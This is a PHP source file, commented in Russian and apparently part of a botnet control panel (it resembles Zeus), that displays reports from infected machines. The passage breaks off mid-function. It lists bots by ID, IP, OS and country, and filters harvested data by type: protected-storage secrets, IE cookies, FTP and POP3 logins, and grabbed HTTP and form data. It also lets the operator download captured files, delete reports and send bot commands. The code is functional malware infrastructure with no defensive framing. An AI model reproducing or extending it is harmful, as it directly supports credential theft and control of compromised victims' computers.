<?php if(!defined('__CP__'))die();
define('REPORT_PREVIEW_MAX_CHARS', 100); //Максимальное количество символов в предпросмотре context и path_source.

$_allow_remove = !empty($_USER_DATA['r_reports_db_edit']);
$rlist = ListReportTables(MYSQL_DB); //Получение списка таблиц botnet_reports_*.

///////////////////////////////////////////////////////////////////////////////
// Вывод отдельного лога.
///////////////////////////////////////////////////////////////////////////////

if(isset($_GET['t']) && isset($_GET['id']))
{
  //Ищим таблицу.
  $tbl = 0;
  foreach($rlist as $t)if(intval(substr($t, -6)) == $_GET['t']){$tbl = $t; break;}
  if($tbl === 0)ThemeFatalError(LNG_REPORTS_VIEW_NOT_EXISTS);

  //Загрузка файла.
  if(isset($_GET['download']))
  {
    $r = @mysql_query("SELECT context, LENGTH(context), path_dest FROM {$tbl} WHERE {$tbl}.id='".addslashes($_GET['id'])."' LIMIT 1");  
    if(!$r)ThemeMySQLError();
    if(@mysql_affected_rows() != 1 || !($m = @mysql_fetch_row($r)))ThemeFatalError(LNG_REPORTS_VIEW_NOT_EXISTS);

    if(($file = basename_ex($m[2])) == '')$file = 'file';
    
    HTTPDownloadHeaders($file, $m[1]);
    echo $m[0];
    die();
  }
  
  //Получаем базовую информацию.   //0            //1            //2                 //3                //4                 //5                 //6                    //7
  $r = @mysql_query("SELECT {$tbl}.bot_id, {$tbl}.botnet, {$tbl}.bot_version, {$tbl}.os_version, {$tbl}.language_id, {$tbl}.time_system, {$tbl}.time_localbias, {$tbl}.time_tick, ".
                            //8           //9             //10         //11                 //12                //13                //14             //15       //16              //17
                    "{$tbl}.rtime, {$tbl}.country, {$tbl}.ipv4, {$tbl}.process_name, {$tbl}.path_source, {$tbl}.type, LENGTH({$tbl}.context), {$tbl}.path_dest, botnet_list.comments, botnet_list.flag_used ".
                    "FROM {$tbl} LEFT JOIN botnet_list ON botnet_list.bot_id={$tbl}.bot_id WHERE {$tbl}.id='".addslashes($_GET['id'])."' LIMIT 1");  
  
  if(!$r)ThemeMySQLError();
  if(@mysql_affected_rows() != 1 || !($m = @mysql_fetch_row($r)))ThemeFatalError(LNG_REPORTS_VIEW_NOT_EXISTS);

  //URL для под запросов к отчету.
  $sub_url = QUERY_STRING_HTML.'&amp;t='.htmlentities_ex(urlencode($_GET['t'])).'&amp;id='.htmlentities_ex(urlencode($_GET['id']));
  
  //Проверяем тип отчета.
  $context = '';
  if($m[13] == BLT_FILE || $m[13] == BLT_UNKNOWN)
  {
    if(($file = basename_ex($m[15])) == '')$file = 'file';

    $context = str_replace(array('{URL}', '{TEXT}'), array($sub_url.'&amp;download=1', sprintf(LNG_REPORTS_VIEW_DOWNLOAD, htmlentities_ex($file), number_format_as_int($m[14]))), THEME_LIST_ANCHOR);
    
    $context =
    str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   '&#160;'), THEME_LIST_ITEM_LTEXT_U2).
    str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $context), THEME_LIST_ITEM_LTEXT_U2);
  }
  else
  {
    $r = @mysql_query("SELECT context FROM {$tbl} WHERE {$tbl}.id='".addslashes($_GET['id'])."' LIMIT 1");    
    if(!$r)ThemeMySQLError();
    if(@mysql_affected_rows() != 1 || !($cc = @mysql_fetch_row($r)))ThemeFatalError(LNG_REPORTS_VIEW_NOT_EXISTS);
    
    $context = str_replace(array('{COLUMNS_COUNT}', '{WIDTH}', '{TEXT}'), array(2, '100%', htmlentities_ex($cc[0])), THEME_LIST_ITEM_PLAIN_U1);
  }
  
  //Вывод.
  $data =
  str_replace('{WIDTH}', '100%', THEME_LIST_BEGIN).
    str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, sprintf(LNG_REPORTS_VIEW_TITLE2, BltToLng($m[13]), number_format_as_int($m[14]))), THEME_LIST_TITLE).
    THEME_LIST_ROW_BEGIN.
      str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_REPORTS_VIEW_BOTID),                                THEME_LIST_ITEM_LTEXT_U1).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', BotPopupMenu($m[0], 'botmenu')),                        THEME_LIST_ITEM_LTEXT_U1).
    THEME_LIST_ROW_END.
    THEME_LIST_ROW_BEGIN.
      str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_REPORTS_VIEW_BOTNET),                               THEME_LIST_ITEM_LTEXT_U2).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlentities_ex($m[1])),                                THEME_LIST_ITEM_LTEXT_U2).
    THEME_LIST_ROW_END.
    THEME_LIST_ROW_BEGIN.
      str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_REPORTS_VIEW_VERSION),                              THEME_LIST_ITEM_LTEXT_U1).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', IntToVersion($m[2])),                                   THEME_LIST_ITEM_LTEXT_U1).
    THEME_LIST_ROW_END.
    THEME_LIST_ROW_BEGIN.
      str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_REPORTS_VIEW_OS),                                   THEME_LIST_ITEM_LTEXT_U2).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', OSDataToString($m[3])),                                 THEME_LIST_ITEM_LTEXT_U2).
    THEME_LIST_ROW_END.
    THEME_LIST_ROW_BEGIN.
      str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_REPORTS_VIEW_OSLANG),                               THEME_LIST_ITEM_LTEXT_U1).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlentities_ex($m[4])),                                THEME_LIST_ITEM_LTEXT_U1).
    THEME_LIST_ROW_END.
    THEME_LIST_ROW_BEGIN.
      str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_REPORTS_VIEW_TIME),                                 THEME_LIST_ITEM_LTEXT_U2).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlentities_ex(gmdate(LNG_FORMAT_DT, $m[5] + $m[6]))), THEME_LIST_ITEM_LTEXT_U2).
    THEME_LIST_ROW_END.
    THEME_LIST_ROW_BEGIN.
      str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_REPORTS_VIEW_TIMEBIAS),                             THEME_LIST_ITEM_LTEXT_U1).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', TimeBiasToText($m[6])),                                 THEME_LIST_ITEM_LTEXT_U1).
    THEME_LIST_ROW_END.
    THEME_LIST_ROW_BEGIN.
      str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_REPORTS_VIEW_TICK),                                 THEME_LIST_ITEM_LTEXT_U2).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', TickCountToTime($m[7] / 1000)),                         THEME_LIST_ITEM_LTEXT_U2).
    THEME_LIST_ROW_END.
    THEME_LIST_ROW_BEGIN.
      str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_REPORTS_VIEW_RTIME),                                THEME_LIST_ITEM_LTEXT_U1).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlentities_ex(gmdate(LNG_FORMAT_DT, $m[8]))),         THEME_LIST_ITEM_LTEXT_U1).
    THEME_LIST_ROW_END.
    THEME_LIST_ROW_BEGIN.
      str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_REPORTS_VIEW_COUNTRY),                              THEME_LIST_ITEM_LTEXT_U2).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlentities_ex($m[9])),                                THEME_LIST_ITEM_LTEXT_U2).
    THEME_LIST_ROW_END.         
    THEME_LIST_ROW_BEGIN.
      str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_REPORTS_VIEW_IPV4),                                 THEME_LIST_ITEM_LTEXT_U1).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlentities_ex($m[10])),                               THEME_LIST_ITEM_LTEXT_U1).
    THEME_LIST_ROW_END.
    THEME_LIST_ROW_BEGIN.
      str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_REPORTS_VIEW_COMMENTS),                             THEME_LIST_ITEM_LTEXT_U2).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', empty($m[16]) ? '-' : htmlentities_ex($m[16])),         THEME_LIST_ITEM_LTEXT_U2).
    THEME_LIST_ROW_END.
    THEME_LIST_ROW_BEGIN.
      str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_REPORTS_VIEW_USED),                                 THEME_LIST_ITEM_LTEXT_U1).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $m[17] == 1 ? LNG_YES : LNG_NO),                        THEME_LIST_ITEM_LTEXT_U1).
    THEME_LIST_ROW_END.
    THEME_LIST_ROW_BEGIN.
      str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_REPORTS_VIEW_PROCNAME),                             THEME_LIST_ITEM_LTEXT_U2).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', empty($m[11]) ? '-' : htmlentities_ex($m[11])),         THEME_LIST_ITEM_LTEXT_U2).
    THEME_LIST_ROW_END.
    THEME_LIST_ROW_BEGIN.
      str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_REPORTS_VIEW_SOURCE),                               THEME_LIST_ITEM_LTEXT_U1).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', empty($m[12]) ? '-' : htmlentities_ex($m[12])),         THEME_LIST_ITEM_LTEXT_U1).
    THEME_LIST_ROW_END.
    THEME_LIST_ROW_BEGIN.
      $context.
    THEME_LIST_ROW_END;
  
  ThemeSmall(LNG_REPORTS_VIEW_TITLE, $data.THEME_LIST_END, 0, GetBotJSMenu('botmenu'), 0);
  
  die();
}

///////////////////////////////////////////////////////////////////////////////
// Определяем данные для фильтра.
///////////////////////////////////////////////////////////////////////////////

//При добавлении новых параметров нужно уничтожать не нужные для js:datelist.

$_FILTER['date1']     = isset($_GET['date1']) ? intval($_GET['date1']) : 0;
$_FILTER['date2']     = isset($_GET['date2']) ? intval($_GET['date2']) : 0;
if($_FILTER['date1'] > $_FILTER['date2']){$t = $_FILTER['date1']; $_FILTER['date1'] = $_FILTER['date2']; $_FILTER['date2'] = $t;}

$_FILTER['date']      = isset($_GET['date'])  ? intval($_GET['date']) : 0;

$_FILTER['bots']      = isset($_GET['bots'])      ? $_GET['bots']      : '';
$_FILTER['botnets']   = isset($_GET['botnets'])   ? $_GET['botnets']   : '';
$_FILTER['ips']       = isset($_GET['ips'])       ? $_GET['ips']       : '';
$_FILTER['countries'] = isset($_GET['countries']) ? $_GET['countries'] : '';

$_FILTER['q']         = isset($_GET['q'])   ? $_GET['q']           : '';
$_FILTER['blt']       = isset($_GET['blt']) ? intval($_GET['blt']) : BLT_UNKNOWN; 

$_FILTER['cs']        = empty($_GET['cs'])       ? 0 : 1;
$_FILTER['grouping']  = empty($_GET['grouping']) ? 0 : 1;
$_FILTER['nonames']   = empty($_GET['nonames'])  ? 0 : 1;
$_FILTER['plain']     = empty($_GET['plain'])    ? 0 : 1;

$_FILTER['rm']        = ($_allow_remove && isset($_GET['rm']) && intval($_GET['rm']) === 1) ? 1 : 0;

///////////////////////////////////////////////////////////////////////////////
// Определяем тип вывода страницы.
///////////////////////////////////////////////////////////////////////////////

$_is_ajax_result  = isset($_GET['q']) && $_FILTER['date1'] > 0 && $_FILTER['date2'] > 0;                                //Страница выводиться как результат поиска ajax.
$_is_ajax_search  = !$_is_ajax_result && $_FILTER['date'] > 0 && isset($_GET['q']);                                     //Страница выводиться как рельутат поиска ajax.
$_is_plain_search = ($_is_ajax_result && $_FILTER['plain'] == 1 && $_FILTER['rm'] == 0 && $_FILTER['blt'] != BLT_FILE); //Cтраница должна открыться как plain-поиск.
if($_is_plain_search)$_is_ajax_result = false;

///////////////////////////////////////////////////////////////////////////////
// Создание запроса.
///////////////////////////////////////////////////////////////////////////////

if($_is_ajax_search || $_is_plain_search)
{
  $q1 = array();
  
  if($_FILTER['blt'] != BLT_UNKNOWN)
  {
    if($_FILTER['blt'] == -1)$q1[] = "(type='".BLT_HTTP_REQUEST."' OR type='".BLT_HTTPS_REQUEST."')";
    else if($_FILTER['blt'] == -2)$q1[] = "(type='".BLT_GRABBED_UI."' OR type='".BLT_GRABBED_HTTP."' OR type='".BLT_GRABBED_WSOCKET."' OR type='".LNG_BLT_GRABBED_OTHER."')";
    else $q1[] = "type='".addslashes($_FILTER['blt'])."'";
  }
  
  if($_is_plain_search)$q1[] = 'type!=\''.BLT_FILE.'\''; //Нельзя искать файлы при текстовом выводе.

  $q1[] = ExpToSQL($_FILTER['countries'], 'country', 0, 1);
  $q1[] = ExpToSQL($_FILTER['ips'],       'ipv4',    1, 1);
  $q1[] = ExpToSQL($_FILTER['botnets'],   'botnet',  0, 1);
  $q1[] = ExpToSQL($_FILTER['bots'],      'bot_id',  0, 1);
  
  {
    $tt = ExpToSQL($_FILTER['q'], 'path_source', $_FILTER['cs'], 0);
    if(!empty($tt))
    {
      $tt .= ' OR '.ExpToSQL($_FILTER['q'], 'path_dest', $_FILTER['cs'], 0);
      $tt .= ' OR '.ExpToSQL($_FILTER['q'], 'context', $_FILTER['cs'], 0);
      $q1[] = '('.$tt.')';
    }
  }

  //Чистим массив.
  foreach($q1 as $k => $v)if($v == '')unset($q1[$k]);

  $query1 = count($q1) > 0 ? ' WHERE '.implode(' AND ', $q1) : '';
  
  $query2 = '';
  if($_FILTER['grouping'])$query2 .= ' GROUP BY context';
  $query2 .= ' ORDER BY bot_id, rtime';

  unset($q1);
}

///////////////////////////////////////////////////////////////////////////////
// HTML фильтр/результат.
///////////////////////////////////////////////////////////////////////////////

if(!$_is_ajax_search && !$_is_plain_search)
{
  define('INPUT_WIDTH',  '200px'); //Ширина input.text.
  define('INPUTQ_WIDTH', '500px'); //Ширина input.text.

  $js_qw     = addjsslashes(LNG_REPORTS_FILTER_REMOVE_Q);
  $js_script = JSCheckAll('botslist', 'checkall', 'bots[]');
  $js_script .= 
<<<JS_SCRIPT
function RemoveReports()
{
  if(confirm('{$js_qw}'))
  {
    var f = document.forms.namedItem('filter');
    f.elements.namedItem('rm').value = 1;
    f.submit();
  }
}
JS_SCRIPT;

  //Подготовливаем список дат.
  if($_is_ajax_result)
  {
    $datelist = '';
    $js_datelist = '';
    
    foreach($rlist as $t)
    {
      $v = intval(substr($t, -6));
      if($v >= $_FILTER['date1'] && $v <= $_FILTER['date2'])
      {
        $datelist .=
        str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(1, htmlentities_ex(gmdate(LNG_FORMAT_DATE, gmmktime(0, 0, 0, substr($t, -4, 2), substr($t, -2, 2), substr($t, -6, 2) + 2000)))), THEME_DIALOG_TITLE).
        THEME_DIALOG_ROW_BEGIN.
          str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN).
            str_replace('{ID}', 'dt'.htmlentities_ex($v), THEME_STRING_ID_BEGIN).
              THEME_IMG_WAIT.
            THEME_STRING_ID_END.
            THEME_STRING_NEWLINE.
            THEME_STRING_NEWLINE.
          THEME_DIALOG_ITEM_CHILD_END.
        THEME_DIALOG_ROW_END;
        
        $js_datelist .= ($js_datelist == '' ? '' : ', ')."['dt".addjsslashes($v)."', '".addjsslashes(urlencode($v))."']";
      }
    }
    
    $f = $_FILTER;
    unset($f['date1']);
    unset($f['date2']);
    unset($f['date']);
    unset($f['plain']);
    
    $q = addjsslashes(QUERY_STRING);
    foreach($f as $k => $v)$q .= '&'.addjsslashes(urlencode($k)).'='.addjsslashes(urlencode($v));
    
    $ajax_init  = JSXMLHttpRequest('datehttp');
    $ajax_err   = addjsslashes(str_replace('{TEXT}', LNG_REPORTS_DATE_ERROR, THEME_STRING_ERROR));
    $js_script .=    
<<<JS_SCRIPT

var datelist = [{$js_datelist}];
var datehttp = false;

function StateChange(i){if(datehttp.readyState == 4)
{
  var el = document.getElementById(datelist[i][0]);
  if(datehttp.status == 200 && datehttp.responseText.length > 1)el.innerHTML = datehttp.responseText;
  else el.innerHTML = '{$ajax_err}';
  SearchDate(++i);
}}

function SearchDate(i)
{
  if(datehttp)delete sockshttp;
  if(i < datelist.length)
  {
    {$ajax_init}
    if(datehttp)
    {
      datehttp.onreadystatechange = function(){StateChange(i)};
      datehttp.open('GET', '{$q}&date=' + datelist[i][1], true);
      datehttp.send(null);
    }
  }
}
JS_SCRIPT;
  }

  ThemeBegin(LNG_REPORTS, $js_script, GetBotJSMenu('botmenu'), $_is_ajax_result ? ' onload="SearchDate(0);"' : 0);
  //Фильтр.
  echo str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('filter', QUERY_SCRIPT_HTML, ''), THEME_FORMGET_BEGIN);
  if($_allow_remove)echo str_replace(array('{NAME}', '{VALUE}'), array('rm', 0), THEME_FORM_VALUE);
  echo
    FORM_CURRENT_MODULE.
    str_replace('{WIDTH}', 'auto', THEME_DIALOG_BEGIN).
      str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, LNG_REPORTS_FILTER_TITLE), THEME_DIALOG_TITLE).
    
      //Даты.
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN).
          LNG_REPORTS_FILTER_DATE_P1.'&#160;'.
          str_replace(array('{NAME}', '{WIDTH}'), array('date1', 'auto'), THEME_DIALOG_ITEM_LISTBOX_BEGIN).
            MakeDateList('date1', $rlist).
          THEME_DIALOG_ITEM_LISTBOX_END.
          '&#160;'.LNG_REPORTS_FILTER_DATE_P2.'&#160;'.
          str_replace(array('{NAME}', '{WIDTH}'), array('date2', 'auto'), THEME_DIALOG_ITEM_LISTBOX_BEGIN).
            MakeDateList('date2', $rlist).
          THEME_DIALOG_ITEM_LISTBOX_END.
          '&#160;'.LNG_REPORTS_FILTER_DATE_P3.
        THEME_DIALOG_ITEM_CHILD_END.
      THEME_DIALOG_ROW_END.
    
      //Стандартный фильтр.
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_GROUP_BEGIN).
          THEME_DIALOG_ROW_BEGIN.
            str_replace('{TEXT}', LNG_REPORTS_FILTER_BOTS, THEME_DIALOG_ITEM_TEXT).
            str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array(INPUT_WIDTH, 'bots',      htmlentities_ex($_FILTER['bots']),      512), THEME_DIALOG_ITEM_INPUT_TEXT).
            THEME_DIALOG_ITEM_MAXSPACE.
            str_replace('{TEXT}', LNG_REPORTS_FILTER_BOTNETS, THEME_DIALOG_ITEM_TEXT).
            str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array(INPUT_WIDTH, 'botnets',   htmlentities_ex($_FILTER['botnets']),   512), THEME_DIALOG_ITEM_INPUT_TEXT).
          THEME_DIALOG_ROW_END.
          THEME_DIALOG_ROW_BEGIN.
            str_replace('{TEXT}', LNG_REPORTS_FILTER_IPS, THEME_DIALOG_ITEM_TEXT).
            str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array(INPUT_WIDTH, 'ips',       htmlentities_ex($_FILTER['ips']),       512), THEME_DIALOG_ITEM_INPUT_TEXT).
            THEME_DIALOG_ITEM_MAXSPACE.
            str_replace('{TEXT}', LNG_REPORTS_FILTER_COUNTRIES, THEME_DIALOG_ITEM_TEXT).
            str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array(INPUT_WIDTH, 'countries', htmlentities_ex($_FILTER['countries']), 512), THEME_DIALOG_ITEM_INPUT_TEXT).
          THEME_DIALOG_ROW_END.
        THEME_DIALOG_GROUP_END.
      THEME_DIALOG_ROW_END.
    
      //Строка поиска.
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{COLUMNS_COUNT}', 2, THEME_DIALOG_GROUP_BEGIN).
          THEME_DIALOG_ROW_BEGIN.
            str_replace('{TEXT}', LNG_REPORTS_FILTER_QUERY, THEME_DIALOG_ITEM_TEXT).
            str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array(INPUTQ_WIDTH, 'q', htmlentities_ex($_FILTER['q']), 4096), THEME_DIALOG_ITEM_INPUT_TEXT).
          THEME_DIALOG_ROW_END.
          THEME_DIALOG_ROW_BEGIN.
            str_replace('{TEXT}', LNG_REPORTS_FILTER_REPORTTYPE, THEME_DIALOG_ITEM_TEXT).
            str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN).
              str_replace(array('{NAME}', '{WIDTH}'), array('blt', 'auto'), THEME_DIALOG_ITEM_LISTBOX_BEGIN).
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_UNKNOWN,           LNG_REPORTS_FILTER_ALL),    $_FILTER['blt'] == BLT_UNKNOWN           ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_PROTECTED_STORAGE, LNG_BLT_PROTECTED_STORAGE), $_FILTER['blt'] == BLT_PROTECTED_STORAGE ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_COOKIES_IE,        LNG_BLT_IE_COOKIES),        $_FILTER['blt'] == BLT_COOKIES_IE        ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_FILE,              LNG_BLT_FILE),              $_FILTER['blt'] == BLT_FILE              ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(-1,                    LNG_BLT_HTTPX_REQUEST),     $_FILTER['blt'] == -1                    ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_HTTP_REQUEST,      LNG_BLT_HTTP_REQUEST),      $_FILTER['blt'] == BLT_HTTP_REQUEST      ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_HTTPS_REQUEST,     LNG_BLT_HTTPS_REQUEST),     $_FILTER['blt'] == BLT_HTTPS_REQUEST     ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_LOGIN_FTP,         LNG_BLT_LOGIN_FTP),         $_FILTER['blt'] == BLT_LOGIN_FTP         ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_LOGIN_POP3,        LNG_BLT_LOGIN_POP3),        $_FILTER['blt'] == BLT_LOGIN_POP3        ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(-2,                    LNG_BLT_GRABBED_X),         $_FILTER['blt'] == -2                    ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_GRABBED_UI,        LNG_BLT_GRABBED_UI),        $_FILTER['blt'] == BLT_GRABBED_UI        ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_GRABBED_HTTP,      LNG_BLT_GRABBED_HTTP),      $_FILTER['blt'] == BLT_GRABBED_HTTP      ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_GRABBED_WSOCKET,   LNG_BLT_GRABBED_WSOCKET),   $_FILTER['blt'] == BLT_GRABBED_WSOCKET   ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_GRABBED_OTHER,     LNG_BLT_GRABBED_OTHER),     $_FILTER['blt'] == BLT_GRABBED_OTHER     ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
              THEME_DIALOG_ITEM_LISTBOX_END.
            THEME_DIALOG_ITEM_CHILD_END.
          THEME_DIALOG_ROW_END.
          THEME_DIALOG_ROW_BEGIN.
            str_replace(array('{COLUMNS_COUNT}', '{NAME}', '{VALUE}', '{TEXT}', '{JS_EVENTS}'),
                        array(2, 'cs', 1, LNG_REPORTS_FILTER_CS, ''),
                        $_FILTER['cs'] ? THEME_DIALOG_ITEM_INPUT_CHECKBOX_ON_2 : THEME_DIALOG_ITEM_INPUT_CHECKBOX_2
                       ).
          THEME_DIALOG_ROW_END.
          THEME_DIALOG_ROW_BEGIN.
            str_replace(array('{COLUMNS_COUNT}', '{NAME}', '{VALUE}', '{TEXT}', '{JS_EVENTS}'),
                        array(2, 'grouping', 1, LNG_REPORTS_FILTER_GROUPQUERY, ''),
                        $_FILTER['grouping'] ? THEME_DIALOG_ITEM_INPUT_CHECKBOX_ON_2 : THEME_DIALOG_ITEM_INPUT_CHECKBOX_2
                       ).
          THEME_DIALOG_ROW_END.
          THEME_DIALOG_ROW_BEGIN.
            str_replace(array('{COLUMNS_COUNT}', '{NAME}', '{VALUE}', '{TEXT}', '{JS_EVENTS}'),
                        array(2, 'nonames', 1, LNG_REPORTS_FILTER_NONAMES, ''),
                        $_FILTER['nonames'] ? THEME_DIALOG_ITEM_INPUT_CHECKBOX_ON_2 : THEME_DIALOG_ITEM_INPUT_CHECKBOX_2
                       ).
          THEME_DIALOG_ROW_END.
          THEME_DIALOG_ROW_BEGIN.
            str_replace(array('{COLUMNS_COUNT}', '{NAME}', '{VALUE}', '{TEXT}', '{JS_EVENTS}'),
                        array(2, 'plain', 1, LNG_REPORTS_FILTER_PLAIN, ''),
                        $_FILTER['plain'] ? THEME_DIALOG_ITEM_INPUT_CHECKBOX_ON_2 : THEME_DIALOG_ITEM_INPUT_CHECKBOX_2
                       ).
          THEME_DIALOG_ROW_END.
        THEME_DIALOG_GROUP_END.
      THEME_DIALOG_ROW_END.
    
      //Управление.
      str_replace('{COLUMNS_COUNT}', 2, THEME_DIALOG_ACTIONLIST_BEGIN).
        str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_REPORTS_FILTER_RESET, ''), THEME_DIALOG_ITEM_ACTION_RESET).
        '&#160;'.
        str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_REPORTS_FILTER_SUBMIT, ''), THEME_DIALOG_ITEM_ACTION_SUBMIT).
        ($_allow_remove ? '&#160;'.str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_REPORTS_FILTER_REMOVE, ' onclick="RemoveReports()"'), THEME_DIALOG_ITEM_ACTION) : '').
      THEME_DIALOG_ACTIONLIST_END.
    THEME_DIALOG_END.
  THEME_FORMGET_END;

  //Вывод результата.
  if($_is_ajax_result)
  {
    //Создание списока дейcтвий.    
    $al = '';
    if($_FILTER['rm'] !== 1 && $_FILTER['nonames'] !== 1 && count($_BOT_MENU) > 0)
    {
      $al = str_replace(array('{NAME}', '{VALUE}', '{JS_EVENTS}'), array('checkall', 1, ' onclick="CheckAll()"'), THEME_DIALOG_ITEM_INPUT_CHECKBOX_3).'&#160;'.
            LNG_REPORTS_BOTSACTION.'&#160;'.str_replace(array('{NAME}', '{WIDTH}'), array('botsaction', 'auto'), THEME_DIALOG_ITEM_LISTBOX_BEGIN);
      foreach($_BOT_MENU as $item)$al .= str_replace(array('{VALUE}', '{TEXT}'), array($item[0], $item[1]), THEME_DIALOG_ITEM_LISTBOX_ITEM);
      $al .= THEME_DIALOG_ITEM_LISTBOX_END.'&#160;'.str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_ACTION_APPLY, ''), THEME_DIALOG_ITEM_ACTION_SUBMIT).THEME_STRING_NEWLINE.THEME_STRING_NEWLINE;
      $al = THEME_DIALOG_ROW_BEGIN.str_replace('{TEXT}', $al, THEME_DIALOG_ITEM_TEXT).THEME_DIALOG_ROW_END;
    }

    //Результат.
    echo
    THEME_VSPACE.
    str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('botslist', QUERY_SCRIPT_HTML, ''), THEME_FORMGET_TO_NEW_BEGIN).
      str_replace('{WIDTH}', '80%', THEME_DIALOG_BEGIN).
        str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(1, LNG_REPORTS_RESULT), THEME_DIALOG_TITLE).
        $al.
        $datelist.
      THEME_DIALOG_END.
    THEME_FORMGET_END;
  }
  
  ThemeEnd();
}
else if($_is_ajax_search)
{
  //Ищим таблицу.
  $table = 0;
  foreach($rlist as $t)if(intval(substr($t, -6)) == $_FILTER['date']){$table = $t; break;}
  if($table === 0)die(LNG_REPORTS_DATE_EMPTY);
  
  //Выполняем запрос.
  if($_FILTER['rm'] === 1)
  {
    if($query1 == '')$q = 'DROP TABLE IF EXISTS '.$table;
    else $q = 'DELETE QUICK FROM '.$table.$query1;
    
    if(!@mysql_query($q))die(mysql_error_ex());
    if($query1 == '')die(LNG_REPORTS_DATE_DROPPED);
    die(sprintf(LNG_REPORTS_DATE_REMOVED, mysql_affected_rows()));
  }
  else
  {
    $last_botid = 0;
    $GLOBALS['_next_bot_popupmenu__'] = $_FILTER['date'];
    
